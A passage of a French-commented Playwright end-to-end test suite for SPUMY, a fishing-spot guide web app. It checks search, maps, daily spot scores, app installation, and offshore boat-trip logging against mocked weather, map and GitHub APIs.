// Tests de bout en bout dans Chromium (Playwright), sur les pages construites
// (racine du dépôt), servies à la racine comme sur GitHub Pages (spumy.github.io/...). Open-Meteo,
// l'API GitHub et les tuiles OpenStreetMap sont simulés au niveau du réseau ;
// tout le reste est réel.
import { chromium, devices } from "playwright";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { omRespond } from "./om_mock.mjs";

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const SHOTS = process.env.SHOTS || path.join(ROOT, "tests/shots");
fs.mkdirSync(SHOTS, { recursive: true });
const PREFIX = "";   // spumy.github.io : le site est à la racine de son adresse
const DOCS = ROOT;   // le site est construit à la racine du dépôt
// Tuile de carte factice (PNG 1×1) : aucun appel réel à OpenStreetMap pendant les tests.
const PNG1 = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");
import { SITE_FILES } from "../scripts/sites.mjs";
const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".json": "application/json", ".webmanifest": "application/manifest+json", ".png": "image/png" };
const server = http.createServer((req, res) => {
  let p = decodeURIComponent(new URL(req.url, "http://x").pathname);
  if (!p.startsWith(PREFIX)) { res.writeHead(404); return res.end(); }
  p = p.slice(PREFIX.length) || "/";
  if (p.endsWith("/")) p += "index.html";
  // Seuls les fichiers du site sont servis : preuve qu'ils suffisent une fois déposés sur GitHub.
  if (!SITE_FILES.includes(p.slice(1))) { res.writeHead(404); return res.end("404"); }
  const f = path.join(DOCS, p);
  if (!f.startsWith(DOCS) || !fs.existsSync(f)) { res.writeHead(404); return res.end("404"); }
  res.writeHead(200, { "Content-Type": TYPES[path.extname(f)] || "application/octet-stream", "Cache-Control": "no-cache" });
  fs.createReadStream(f).pipe(res);
});
await new Promise((r) => server.listen(8765, r));
const BASE = `http://localhost:8765${PREFIX}`;

const browser = await chromium.launch();
// Toute violation de la politique de sécurité (CSP), dans n'importe quel parcours, fait échouer les tests.
const cspViolations = [];
const watchCsp = (c, tag = "") => c.on("console", (m) => { if (/Content Security Policy|Refused to (load|connect|execute|apply)/i.test(m.text()) && !/exemple\.invalid|__xss/.test(m.text())) cspViolations.push(`${tag}${m.text().slice(0, 160)}`); });
const _newContext = browser.newContext.bind(browser);
browser.newContext = async (o) => { const c = await _newContext(o); watchCsp(c); return c; };
const results = [];
const ok = (cond, label) => results.push([!!cond, label]);

// ── Faux dépôt GitHub (API contents) ──
function fakeGitHub(opts = {}) {
  const files = new Map(Object.entries(opts.files || {}).map(([k, v]) => [k, { content: v, sha: "s" + Math.random().toString(36).slice(2) }]));
  const log = [];
  let conflicts = opts.conflicts || 0;
  const handler = async (route) => {
    const req = route.request(); const u = new URL(req.url());
    const m = u.pathname.match(/^\/repos\/([^/]+)\/([^/]+)(?:\/contents\/(.+))?$/);
    log.push(req.method() + " " + u.pathname);
    const auth = req.headers()["authorization"] || "";
    const json = (status, body) => route.fulfill({ status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(body) });
    if (opts.status401 || auth !== "Bearer github_pat_TEST") return json(401, { message: "Bad credentials" });
    if (!m) return json(404, { message: "Not Found" });
    if (!m[3]) return json(200, { full_name: `${m[1]}/${m[2]}`, private: !opts.publicRepo });
    const file = decodeURIComponent(m[3]);
    if (req.method() === "GET") {
      const f = files.get(file);
      if (!f) return json(404, { message: files.size ? "Not Found" : "This repository is empty." });
      return json(200, { name: file, sha: f.sha, encoding: "base64", content: Buffer.from(f.content, "utf8").toString("base64").replace(/(.{60})/g, "$1\n") });
    }
    if (req.method() === "PUT") {
      const body = JSON.parse(req.postData());
      if (conflicts > 0) { conflicts--; return json(409, { message: "is at x but expected y" }); }
      const cur = files.get(file);
      if (cur && body.sha !== cur.sha) return json(409, { message: "sha mismatch" });
      const sha = "s" + Math.random().toString(36).slice(2);
      files.set(file, { content: Buffer.from(body.content, "base64").toString("utf8"), sha });
      return json(cur ? 200 : 201, { content: { sha } });
    }
    return json(405, {});
  };
  return { handler, files, log };
}

// v8.9 — Le verdict dépend de l'heure (un créneau fini n'est plus proposé) : les parcours tournent à une heure
// fixe, aujourd'hui à 06h30 à Paris, l'horloge avançant ensuite normalement.
const parisToday = new Intl.DateTimeFormat("en-CA", { timeZone: "Europe/Paris", year: "numeric", month: "2-digit", day: "2-digit" }).format(new Date());
const parisOffsetMs = (ms) => Date.parse(new Date(ms).toLocaleString("sv-SE", { timeZone: "Europe/Paris" }).replace(" ", "T") + "Z") - ms;
const FIXED_NOW = (() => { const guess = Date.parse(`${parisToday}T06:30:00Z`); return guess - parisOffsetMs(guess); })();
const CLOCKED = new WeakSet();
async function openApp(site, { scenario = "nominal", sync = null, gh = null, init = null, sw = "block", context = null, now = FIXED_NOW } = {}) {
  const ctx = context || await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: sw });
  // Horloge fixée aussi pour un contexte fourni (hors ligne…) : sinon, lancé le soir, plus aucun créneau du jour.
  if (now != null && !CLOCKED.has(ctx)) { CLOCKED.add(ctx); await ctx.clock.install({ time: now }); }
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", (e) => errors.push("pageerror: " + e.message));
  page.on("console", (m) => { if (m.type() === "error" && !/Failed to load resource/.test(m.text())) errors.push("console: " + m.text()); });
  const om = { calls: 0, scenario, tiles: 0 };
  await ctx.route(/tile\.openstreetmap\.org/, (route) => { om.tiles++; return route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }); });
  await ctx.route(/open-meteo\.com/, async (route) => {
    om.calls++;
    if (om.scenario === "offline") return route.abort("internetdisconnected");
    const r = omRespond(route.request().url(), om.scenario);
    await route.fulfill({ status: r.status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(r.body) });
  });
  if (gh) await ctx.route(/api\.github\.com/, gh.handler);
  if (sync) await ctx.addInitScript((c) => { if (!localStorage.getItem("bar:sync")) localStorage.setItem("bar:sync", JSON.stringify(c)); }, sync);
  if (init) await ctx.addInitScript(init);
  await page.goto(`${BASE}/${site}.html`);
  return { ctx, page, errors, om };
}
const T = (page) => page.evaluate(() => document.body.innerText);
const waitCalls = async (om, n, ms = 8000) => { const t0 = Date.now(); while (om.calls < n && Date.now() - t0 < ms) await new Promise((r) => setTimeout(r, 50)); };
const waitText = (page, re, ms = 15000) => page.waitForFunction((src) => new RegExp(src).test(document.body.innerText), re.source, { timeout: ms });
const READY = /Conditions du jour/;
const WX = /🌬 [A-Z]{1,3} \d+ km\/h/;   // la météo du créneau est arrivée
// v9.2 : barre du bas à cinq entrées (Décision, Carte, Journal, Matériel, Plus) ; Marée, Météo, Saison, Règles et
// Photos s'ouvrent depuis le sommaire « Plus ». Les anciens noms d'onglets restent acceptés ici.
const PILLAR = { "Synthèse": "Décision", "Spots": "Carte", "Leurres": "Matériel", "Journal": "Journal", "Plus": "Plus", "Décision": "Décision", "Carte": "Carte", "Matériel": "Matériel" };
const tab = async (page, name) => {
  if (PILLAR[name]) await page.getByRole("tab", { name: PILLAR[name], exact: true }).click();
  else {
    await page.getByRole("tab", { name: "Plus", exact: true }).click(); await page.waitForTimeout(150);
    await page.getByRole("button", { name: new RegExp(`^${name}`) }).first().click();
  }
  await page.waitForTimeout(250);
};
const btn = (page, name) => page.getByRole("button", { name }).first();

// ── 0. Page d'accueil : une seule application (accueil + sept guides) ──
{
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", serviceWorkers: "block" });
  await ctx.route(/open-meteo\.com/, async (route) => { const r = omRespond(route.request().url(), "nominal");
    await route.fulfill({ status: r.status, contentType: "application/json", body: JSON.stringify(r.body) }); });
  await ctx.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
  const page = await ctx.newPage(); const bad = [], errs = [];
  page.on("response", (r) => { if (r.status() >= 400 && r.url().startsWith(BASE)) bad.push(r.url()); });
  page.on("pageerror", (e) => errs.push(e.message));
  await page.goto(`${BASE}/`);
  const home = await T(page);
  const guidesTxt = await page.evaluate(() => [...document.querySelectorAll("details.dept")].map((d) => d.textContent).join(" "));
  ok(/Logonna-Daoulas/.test(guidesTxt) && /Pirou Plage/.test(guidesTxt) && /Plouguerneau/.test(guidesTxt) && /Audierne/.test(guidesTxt) && /Carantec/.test(guidesTxt) && /Concarneau/.test(guidesTxt) && /Crozon/.test(guidesTxt), "accueil : sept guides proposés");
  // v8.15 — Un menu repliable par département, fermé par défaut ; ouvert, il le reste sur l'appareil.
  const dState = async () => page.evaluate(() => [...document.querySelectorAll("details.dept")].map((d) => `${d.getAttribute("data-dept")}:${d.open ? "ouvert" : "fermé"}:${(() => { const c = d.querySelector("a.card"); return c && (c.checkVisibility ? c.checkVisibility() : c.offsetParent) ? "visible" : "caché"; })()}`).join(" "));
  ok(await dState() === "29:fermé:caché 50:fermé:caché", "accueil : départements repliés par défaut" + ` — ${await dState()}`);
  await page.click('details.dept[data-dept="50"] > summary'); await page.waitForTimeout(200);
  ok(await dState() === "29:fermé:caché 50:ouvert:visible", "accueil : toucher « Manche » déplie ses guides");
  await page.reload();
  ok(await dState() === "29:fermé:caché 50:ouvert:visible", "accueil : le département ouvert le reste au retour sur l'accueil");
  ok(/Version 9\.2 · [0-9a-f]{12}/.test(home), "accueil : numéro de version affiché (vérifier le dépôt)");
  ok(await page.isVisible("#install") && !(await page.isVisible("#install-btn")) && /Installer sur le téléphone/.test(home), "accueil (navigateur) : aide à l'installation, pas de bouton tant que Chrome ne le propose pas");
  await page.screenshot({ path: `${SHOTS}/accueil.png` });
  // Manifeste commun : une application, qui s'ouvre sur l'accueil.
  const m = await page.evaluate(async () => (await fetch(document.querySelector("link[rel=manifest]").href)).json());
  ok(m.id === undefined && m.start_url === "./" && m.scope === "./" && m.display === "standalone" && m.name && m.short_name, "manifeste commun : ouverture sur l'accueil, portée = tout le site, identifiant = start_url");
  const icons = await page.evaluate(async (list) => Promise.all(list.map(async (i) => {
    const r = await fetch(i.src); const b = await createImageBitmap(await r.blob()); return { ...i, ok: r.ok, w: b.width, h: b.height };
  })), m.icons);
  ok(icons.some((i) => i.sizes === "192x192" && i.w === 192 && i.h === 192 && i.purpose === "any")
    && icons.some((i) => i.sizes === "512x512" && i.w === 512 && i.h === 512 && i.purpose === "any")
    && icons.some((i) => i.purpose === "maskable" && i.w === 512), "manifeste : icônes 192 et 512 (dimensions réelles) + maskable");
  // v9.1 — Marque SPUMY : nom court entier sous l'icône, icône iPhone 180 px, aucune écriture « /100 ».
  const apple = await page.evaluate(async () => { const l = document.querySelector("link[rel=apple-touch-icon]"); const r = await fetch(l.href); const b = await createImageBitmap(await r.blob()); return { href: l.getAttribute("href"), ok: r.ok, w: b.width, title: document.querySelector('meta[name="apple-mobile-web-app-title"]').content }; });
  ok(m.short_name === "SPUMY" && apple.title === "SPUMY" && apple.ok && apple.w === 180 && /^SPUMY/.test(m.name) && !/\/100/.test(JSON.stringify(m)), `marque : « SPUMY » sous l'icône, icône iPhone 180 px, manifeste sans /100 — ${JSON.stringify(apple)}`);
  ok(/^SPUMY/.test(await page.title()) && await page.locator("header.brand h1").innerText() === "SPUMY" && await page.locator('header.brand img[alt=""]').count() === 1, "accueil : en-tête SPUMY en vrai texte, image décorative");
  const sc = await page.evaluate(async (list) => Promise.all(list.map(async (x) => (await fetch(x.url)).ok)), m.shortcuts || []);
  ok(m.shortcuts?.length === 7 && sc.every(Boolean) && m.shortcuts.map((x) => x.url).join() === "./logonna.html,./pirou.html,./plouguerneau.html,./audierne.html,./carantec.html,./concarneau.html,./crozon.html", "manifeste : raccourcis directs vers les sept guides");
  // Bouton « Installer » : apparaît quand Chrome signale l'installation possible, et la lance.
  await page.evaluate(() => {
    const e = new Event("beforeinstallprompt", { cancelable: true });
    e.prompt = () => { window.__prompted = true; }; e.userChoice = Promise.resolve({ outcome: "accepted", platform: "web" });
    window.dispatchEvent(e); window.__bipDefault = e.defaultPrevented;
  });
  ok(await page.isVisible("#install-btn") && await page.evaluate(() => window.__bipDefault), "accueil : bouton « Installer l'application » quand Chrome le permet");
  await page.click("#install-btn");
  await page.evaluate(() => window.dispatchEvent(new Event("appinstalled")));
  ok(await page.evaluate(() => window.__prompted) && !(await page.isVisible("#install-btn")) && /Application installée/.test(await T(page)), "accueil : le bouton lance l'installation, confirmation affichée");
  // Les trois pages déclarent le même manifeste (donc la même application).
  const mhref = await page.evaluate(() => document.querySelector("link[rel=manifest]").href);
  await page.click('a[href="pirou.html"]'); await waitText(page, READY);
  ok(/SPUMY[\s·]+Pirou Plage/.test(await T(page)), "accueil → Pirou : le guide s'ouvre");
  ok(await page.evaluate(() => document.querySelector("link[rel=manifest]").href) === mhref, "Pirou : même manifeste que l'accueil");
  // Retour à l'accueil depuis le titre du guide (pas de barre d'adresse dans l'application installée).
  await page.getByRole("link", { name: /SPUMY · Pirou Plage/ }).click();
  await page.waitForURL(/index\.html$/);
  ok(/Pirou Plage/.test(await T(page)) && /Chercher un spot/.test(await T(page)), "Pirou → titre → retour à l'accueil");
  await page.click('details.dept[data-dept="29"] > summary');
  await page.click('a[href="logonna.html"]'); await waitText(page, READY);
  ok(await page.evaluate(() => document.querySelector("link[rel=manifest]").href) === mhref, "Logonna : même manifeste que l'accueil");
  // v8.9 — Accueil : guides regroupés par département, recherche d'un spot par saisie.
  await page.goto(`${BASE}/`);
  const depts = await page.evaluate(() => [...document.querySelectorAll("details.dept")].map((s) => ({
    h: s.querySelector("h2").textContent, g: [...s.querySelectorAll("a.card")].map((a) => a.getAttribute("href")) })));
  ok(depts.length === 2 && /^Finistère \(29\)/.test(depts[0].h) && /6\u00a0guides · 56\u00a0spots/.test(depts[0].h)
    && depts[0].g.join() === "carantec.html,plouguerneau.html,logonna.html,crozon.html,audierne.html,concarneau.html"
    && /^Manche \(50\)/.test(depts[1].h) && depts[1].g.join() === "pirou.html", "accueil : guides regroupés par département, du nord au sud" + ` — ${JSON.stringify(depts)}`);
  ok(await page.evaluate(() => document.getElementById("results").hidden) && (await page.textContent("#count")) === "", "recherche : rien d'affiché tant que le champ est vide");
  const hits = async () => page.evaluate(() => [...document.querySelectorAll("#results a")].map((a) => ({ href: a.getAttribute("href"), t: a.querySelector("strong").textContent, g: a.querySelector(".g").textContent })));
  await page.fill("#q", "penhir");
  let h = await hits();
  ok(h[0]?.t === "Pointe de Pen-Hir" && h[0].href === "logonna.html#spot=penhir" && /Guide Logonna-Daoulas · Finistère/.test(h[0].g), "recherche « penhir » (sans tiret) : Pointe de Pen-Hir, guide Logonna" + ` — ${JSON.stringify(h[0])}`);
  await page.fill("#q", "LAITA"); h = await hits();
  ok(h[0]?.t === "Estuaire de la Laïta" && h[0].href === "concarneau.html#spot=laita", "recherche sans accent ni casse : « LAITA » trouve la Laïta");
  await page.fill("#q", "Cotentin"); h = await hits();
  ok(h.length === 10 && h.every((x) => x.href.startsWith("pirou.html#spot=")) && /10 spots trouvés/.test(await page.textContent("#count")), "recherche par région : « Cotentin » donne les 10 spots du guide Pirou");
  await page.fill("#q", "pointe"); h = await hits();
  ok(h.length === 12 && /spots trouvés, les 12 premiers sont affichés/.test(await page.textContent("#count")) && h.every((x) => /^Pointe/.test(x.t)), "recherche large : 12 résultats affichés, ceux dont le nom commence par la saisie d'abord");
  await page.fill("#q", "douarnenez"); h = await hits();
  ok(h.filter((x) => x.href.startsWith("crozon.html#spot=")).length === 7 && h.some((x) => x.t === "Pointe de Leydé") && h.some((x) => x.t === "Pointe de Brézellec"),
    "recherche « douarnenez » : les 7 spots du guide Crozon, et Brézellec (Audierne), aussi sur la baie" + ` — ${h.map((x) => x.t).join(", ")}`);
  await page.fill("#q", "plouescat"); h = await hits();
  ok(h[0]?.t === "Baie du Kernic", "recherche par commune : « plouescat » trouve la baie du Kernic");
  await page.fill("#q", "xyzzy");
  ok(await page.evaluate(() => document.getElementById("results").hidden) && /Aucun spot ne correspond à « xyzzy »/.test(await page.textContent("#count")), "recherche sans résultat : message clair");
  await page.fill("#q", "trev"); await page.press("#q", "ArrowDown");
  ok(await page.evaluate(() => document.activeElement?.getAttribute("href")) === "concarneau.html#spot=trevignon", "clavier : flèche bas → premier résultat");
  await page.keyboard.press("ArrowUp");
  ok(await page.evaluate(() => document.activeElement?.id) === "q", "clavier : flèche haut → retour au champ");
  await page.keyboard.press("Escape");
  ok((await page.inputValue("#q")) === "" && await page.evaluate(() => document.getElementById("results").hidden), "clavier : Échap vide la recherche");
  await page.fill("#q", "Trévignon"); await page.press("#q", "Enter");
  await page.waitForURL(/concarneau\.html#spots$/); await waitText(page, /Pointe de Trévignon/);
  const opened = await page.evaluate(() => ({ tab: document.querySelector('[role="tab"][aria-selected="true"]')?.textContent, hash: location.hash }));
  await page.waitForTimeout(400);
  const sheet = await page.evaluate(() => { const h = [...document.querySelectorAll("h2,h3")].find((x) => /Pointe de Trévignon/.test(x.textContent)); if (!h) return null; const r = h.getBoundingClientRect(); return { top: r.top, vh: innerHeight }; });
  ok(opened.tab === "Carte" && opened.hash === "#spots" && sheet && sheet.top >= 0 && sheet.top < sheet.vh, "Entrée : le guide s'ouvre sur la fiche du spot trouvé (onglet Carte, fiche à l'écran)" + ` — ${JSON.stringify({ opened, sheet })}`);
  await page.goBack(); await page.waitForURL(/\/(index\.html)?$/);
  ok(/Chercher un spot/.test(await T(page)), "retour : l'accueil revient");
  await page.screenshot({ path: `${SHOTS}/accueil-recherche.png` });
  ok(bad.length === 0, "aucun fichier manquant" + (bad.length ? " — " + bad.join(", ") : ""));
  ok(errs.length === 0, "accueil et guides : aucune erreur JavaScript" + (errs.length ? " — " + errs.join(" | ") : ""));
  await ctx.close();
}
// ── 0 bis. v8.14 : carte de tous les spots sur l'accueil, pastille = note du jour calculée par le guide ──
{
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block" });
  await ctx.clock.install({ time: FIXED_NOW });
  const om = { calls: 0 };
  await ctx.route(/open-meteo\.com/, async (route) => { om.calls++; const r = omRespond(route.request().url(), "nominal");
    await route.fulfill({ status: r.status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(r.body) }); });
  await ctx.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
  const page = await ctx.newPage(); const errs = [];
  page.on("pageerror", (e) => errs.push(e.message));
  page.on("console", (m) => { if (m.type() === "error" && !/Failed to load resource/.test(m.text())) errs.push(m.text()); });
  await page.goto(`${BASE}/`);
  await waitText(page, /Notes d'aujourd'hui calculées pour les 7 guides/, 40000).catch(() => {});
  const marks = async () => page.evaluate(() => [...document.querySelectorAll("path.gspot")].map((p) => ({ cls: [...p.classList].find((c) => /^gspot-[a-z]+-/.test(c)), score: p.getAttribute("data-score"), name: p.getAttribute("data-name"), fill: p.getAttribute("fill") })));
  const mk = await marks();
  ok(mk.length === 66 && mk.every((m) => m.score !== "?"), `carte de l'accueil : les 66 spots des sept guides, tous notés (${mk.length})`);
  ok(om.calls > 0 && om.calls <= 21, `carte de l'accueil : la météo de chaque guide en une fois (${om.calls} requêtes Open-Meteo, 3 par guide au plus)`);
  ok(mk.every((m) => (m.score === "–" ? m.fill === "#475569" || /^#/.test(m.fill) : true)) && mk.some((m) => m.fill === "#22c55e"), "carte de l'accueil : pastilles colorées selon la note (vert ≥ 7)");
  // La pastille est exactement la note que le guide affiche (même moteur, même météo, mêmes réglages), et le guide
  // s'ouvre ensuite sans redemander la météo téléchargée par l'accueil.
  const calls0 = om.calls, mism = [];
  for (const key of ["logonna", "pirou", "plouguerneau", "audierne", "carantec", "concarneau", "crozon"]) {
    const g = await ctx.newPage(); g.on("pageerror", (e) => errs.push(`${key} : ${e.message}`));
    await g.goto(`${BASE}/${key}.html#spots`);
    await g.waitForFunction(() => /Voir les \d+/.test(document.body.innerText), null, { timeout: 20000 });
    await g.waitForTimeout(600);
    await g.getByRole("button", { name: /^Voir les \d+/ }).first().click();
    const rows = await g.evaluate(() => [...document.querySelectorAll("button")].filter((b) => /^#\d+/.test(b.innerText)).map((b) => { const sp = b.querySelectorAll(":scope > span"); return [b.querySelector("b").textContent, sp[sp.length - 1].textContent]; }));
    const hm = Object.fromEntries(mk.filter((m) => m.cls.startsWith(`gspot-${key}-`)).map((m) => [m.name, m.score]));
    if (rows.length !== Object.keys(hm).length) mism.push(`${key} : ${rows.length} spots dans le guide, ${Object.keys(hm).length} sur la carte`);
    for (const [n, sc] of rows) if (hm[n] !== sc) mism.push(`${key}/${n} : guide ${sc}, accueil ${hm[n]}`);
    await g.close();
  }
  ok(mism.length === 0, "carte de l'accueil : chaque pastille porte la note affichée par son guide (66 spots comparés)" + (mism.length ? " — " + mism.slice(0, 4).join(" | ") : ""));
  ok(om.calls === calls0, `guides ouverts après l'accueil : météo du jour et de la semaine reprise du cache, aucune requête (${om.calls - calls0})`);
  // Meilleurs spots, tous guides confondus : liens vers les fiches, du meilleur au moins bon.
  const top = await page.evaluate(() => [...document.querySelectorAll('nav[aria-label^="Meilleurs spots"] a')].map((a) => ({ href: a.getAttribute("href"), sc: parseFloat(a.lastElementChild.textContent.replace(",", ".")) })));
  ok(top.length === 5 && top.every((x, i) => /^[a-z]+\.html#spot=[\w-]+$/.test(x.href) && (i === 0 || x.sc <= top[i - 1].sc)), "accueil : les 5 meilleurs spots du jour, tous guides confondus, avec le lien de leur fiche" + ` — ${JSON.stringify(top)}`);
  const best = mk.filter((m) => m.score !== "–").sort((a, b) => parseFloat(b.score.replace(",", ".")) - parseFloat(a.score.replace(",", ".")))[0];
  ok(best && top[0] && parseFloat(best.score.replace(",", ".")) === top[0].sc, "accueil : le premier de la liste a la meilleure pastille de la carte");
  // Toucher un spot sur la carte : sa note et le lien de sa fiche.
  await page.locator("#home-app .leaflet-container").scrollIntoViewIfNeeded(); await page.waitForTimeout(300);
  const b = await page.locator("path.gspot-concarneau-trevignon").boundingBox().catch(() => null);
  if (b) await page.mouse.click(b.x + b.width / 2, b.y + b.height / 2);
  await page.waitForTimeout(300);
  const card = await page.evaluate(() => { const r = document.querySelector('[aria-label="Spot choisi sur la carte"]'); return r ? { t: r.innerText, href: r.querySelector("a")?.getAttribute("href") } : null; });
  ok(card && /Pointe de Trévignon/.test(card.t) && /Guide Concarneau/.test(card.t) && /Note \d,\d|Non proposé/.test(card.t) && card.href === "concarneau.html#spot=trevignon", "carte de l'accueil : toucher un spot donne sa note et le lien de sa fiche" + ` — ${JSON.stringify(card)}`);
  // Demain : notes de demain pour les sept guides.
  await page.getByRole("button", { name: "Demain", exact: true }).click();
  await waitText(page, /Notes de demain calculées pour les 7 guides/, 40000).catch(() => {});
  const mk2 = await marks();
  ok(/Notes de demain calculées pour les 7 guides/.test(await T(page)) && mk2.length === 66 && mk2.every((m) => m.score !== "?") && /Meilleurs spots demain/.test(await T(page)), "carte de l'accueil : bascule sur demain");
  await page.screenshot({ path: `${SHOTS}/accueil-carte.png` });
  ok(errs.length === 0, "carte de l'accueil : aucune erreur JavaScript" + (errs.length ? " — " + errs.slice(0, 2).join(" | ") : ""));
  await ctx.close();
}
// ── 0 ter. v8.15 : onglets Inshore / Offshore ; pêche en bateau (spots, conditions, sorties, modèle empirique) ──
{
  const SYNC = { owner: "spumy", repo: "journal", token: "github_pat_TEST" };
  const gh = fakeGitHub();
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block" });
  await ctx.clock.install({ time: FIXED_NOW });
  const om = { calls: 0 };
  await ctx.route(/open-meteo\.com/, async (route) => { om.calls++; const r = omRespond(route.request().url(), "nominal");
    await route.fulfill({ status: r.status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(r.body) }); });
  await ctx.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
  await ctx.route(/api\.github\.com/, gh.handler);
  await ctx.addInitScript((c) => { if (!localStorage.getItem("bar:sync")) localStorage.setItem("bar:sync", JSON.stringify(c)); }, SYNC);
  const page = await ctx.newPage(); const errs = [];
  page.on("pageerror", (e) => errs.push(e.message));
  page.on("console", (m) => { if (m.type() === "error" && !/Failed to load resource/.test(m.text())) errs.push(m.text()); });
  await page.goto(`${BASE}/`);
  const tabs = async () => page.evaluate(() => ({ ins: !document.getElementById("panel-inshore").hidden, off: !document.getElementById("panel-offshore").hidden,
    sel: document.querySelector('[role=tab][aria-selected="true"]')?.id }));
  let st = await tabs();
  ok(st.ins && !st.off && st.sel === "tab-inshore" && await page.getByRole("tab").count() === 2, "accueil : deux onglets, Inshore ouvert par défaut");
  await page.getByRole("tab", { name: /Offshore/ }).click();
  st = await tabs();
  ok(!st.ins && st.off && st.sel === "tab-offshore" && /#offshore$/.test(page.url()), "accueil : l'onglet Offshore affiche la pêche en bateau (lien #offshore)");
  await page.keyboard.press("ArrowLeft");
  ok((await tabs()).sel === "tab-inshore" && await page.evaluate(() => document.activeElement?.id) === "tab-inshore", "onglets : flèches du clavier");
  await page.keyboard.press("ArrowRight");
  await page.reload();
  ok((await tabs()).off, "onglets : le dernier choisi revient à l'ouverture suivante");
  await waitText(page, /Tes spots bateau/, 10000).catch(() => {});
  const app = () => page.evaluate(() => document.getElementById("offshore-app").innerText);
  ok(/Aucun spot pour l'instant/.test(await app()) && /aucune marque n'est fournie/.test(await app()), "offshore : aucun spot fourni d'avance, c'est toi qui les ajoutes");
  // Ajout d'un spot bateau.
  await page.getByRole("button", { name: "＋ Ajouter un spot bateau" }).click();
  const bf = page.locator('form[aria-label="Ajouter un spot bateau"]');
  await bf.getByRole("button", { name: "Ajouter ce spot", exact: true }).click();
  ok(/Donne un nom au spot/.test(await app()), "spot bateau : sans nom, refusé");
  await page.fill("#bs-name", "Basse test e2e");
  await bf.getByRole("button", { name: "Ajouter ce spot", exact: true }).click();
  ok(/Place le spot/.test(await app()), "spot bateau : sans position, refusé");
  await bf.getByLabel("Coordonnées du spot bateau ou lien Google Maps").fill("48.20, -4.80");
  await bf.getByRole("button", { name: "Placer", exact: true }).click();
  await bf.getByRole("button", { name: "Épave", exact: true }).click();
  await page.fill("#bs-depth", "35");
  const c0 = om.calls;
  await bf.getByRole("button", { name: "Ajouter ce spot", exact: true }).click();
  await page.waitForFunction(() => /Conditions · Basse test e2e/.test(document.getElementById("offshore-app").innerText) && document.querySelectorAll("#offshore-app tbody tr").length === 6, null, { timeout: 15000 }).catch(() => {});
  const spots = await page.evaluate(() => JSON.parse(localStorage.getItem("bar:offshore:spots") || "[]"));
  ok(spots.length === 1 && /^b-[a-z0-9]+$/.test(spots[0].id) && spots[0].type === "epave" && spots[0].depth === 35 && spots[0].lat === 48.2, "spot bateau : enregistré (type, profondeur, position)" + ` — ${JSON.stringify(spots[0] || {}).slice(0, 140)}`);
  const cond = await app();
  ok(om.calls - c0 >= 2 && await page.locator("#offshore-app tbody tr").count() === 6 && /\d+ km\/h/.test(cond) && /\d,\d m/.test(cond) && /Eau \d+,\d °C/.test(cond), `spot bateau : conditions heure par heure (vent, rafales, vagues, houle, eau) — ${om.calls - c0} requêtes`);
  ok(/Marée de Brest \(guide Logonna-Daoulas\) : /.test(cond) && /PM \d\dh\d\d \(coef \d+\)/.test(cond), "spot bateau : marée du port de guide le plus proche");
  ok(await page.getByRole("button", { name: "Dem.", exact: true }).count() === 1 && await page.locator('#offshore-app [role=group][aria-label="Jour"] button').count() === 7, "spot bateau : conditions des 7 prochains jours");
  ok(!/Note\b/.test(await page.locator("#offshore-app thead").innerText()), "spot bateau : pas de note sans sorties (modèle empirique)");
  await page.getByRole("button", { name: "Dem.", exact: true }).click();
  ok(/Samedi 31 octobre|Samedi|samedi|Dimanche|Lundi|Mardi|Mercredi|Jeudi|Vendredi/.test(await app()) && await page.locator("#offshore-app tbody tr").count() === 6, "spot bateau : le jour choisi change les conditions affichées");
  // Sorties : une avec prises, un capot.
  const trip = async (start, end, catches) => {
    await page.getByRole("button", { name: "＋ Enregistrer une sortie" }).click();
    const tf = page.locator('form[aria-label="Enregistrer une sortie en bateau"]');
    await page.fill("#tr-start", start); await page.fill("#tr-end", end);
    for (const [i, [sp, n]] of catches.entries()) { await tf.getByRole("button", { name: "＋ Ajouter une prise" }).click(); await page.selectOption(`#tr-sp-${i}`, sp); await page.fill(`#tr-n-${i}`, String(n)); }
    await tf.getByRole("button", { name: "Enregistrer la sortie" }).click();
  };
  await page.getByRole("button", { name: "＋ Enregistrer une sortie" }).click();
  await page.locator('form[aria-label="Enregistrer une sortie en bateau"]').getByRole("button", { name: "Enregistrer la sortie" }).click();
  ok(/Indique l'heure de début et de fin/.test(await app()), "sortie : heures exigées");
  await page.locator('form[aria-label="Enregistrer une sortie en bateau"]').getByRole("button", { name: "Annuler" }).click();
  await trip("05:00", "06:15", [["lieu-jaune", 3], ["bar", 1]]);
  await trip("04:00", "05:00", []);
  await page.waitForFunction(() => (JSON.parse(localStorage.getItem("bar:offshore:trips") || "[]")).filter((t) => t.cond).length === 2, null, { timeout: 15000 }).catch(() => {});
  const trips = await page.evaluate(() => JSON.parse(localStorage.getItem("bar:offshore:trips") || "[]"));
  const withC = trips.find((t) => t.catches.length === 2), cap = trips.find((t) => !t.catches.length);
  ok(trips.length === 2 && withC?.catches.map((c) => `${c.sp}:${c.n}`).join() === "lieu-jaune:3,bar:1" && cap, "sorties : prises par espèce, et un capot gardé comme sortie" + ` — ${JSON.stringify(trips.map((t) => t.catches))}`);
